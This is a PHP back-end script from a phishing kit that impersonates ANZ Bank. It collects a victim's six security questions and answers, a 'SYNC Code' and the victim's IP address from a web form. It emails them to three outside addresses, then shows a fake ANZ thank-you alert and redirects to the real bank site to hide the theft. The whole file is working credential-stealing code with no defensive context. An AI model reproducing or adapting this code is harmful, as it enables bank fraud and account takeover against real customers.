<?

$ip = getenv("REMOTE_ADDR");
$message .= "--Coded by smalljama----\n";
$message .= "Question1: ".$_POST['question1']."\n";
$message .= "Answer1: ".$_POST['answer1']."\n";
$message .= "Question2: ".$_POST['question2']."\n";
$message .= "Answer2: ".$_POST['answer2']."\n";
$message .= "Question3: ".$_POST['question3']."\n";
$message .= "Answer3: ".$_POST['answer3']."\n";
$message .= "Question4: ".$_POST['question4']."\n";
$message .= "Answer4: ".$_POST['answer4']."\n";
$message .= "Question5: ".$_POST['question5']."\n";
$message .= "Answer5: ".$_POST['answer5']."\n";
$message .= "Question6: ".$_POST['question6']."\n";
$message .= "Answer6: ".$_POST['answer6']."\n";
$message .= "SYNC Code: ".$_POST['email']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----Coded by smalljama----------------\n";



$recipient = "jbloginbox07@gmail.com,jblogindesign07@hotmail.com,joel.osazie@mail.ru";
$subject = "ANZ Bank";
$headers = "From: JoELobABa";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Thank you for using ANZ Internet Banking.');
window.location='https://www.anz.com.au/personal/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>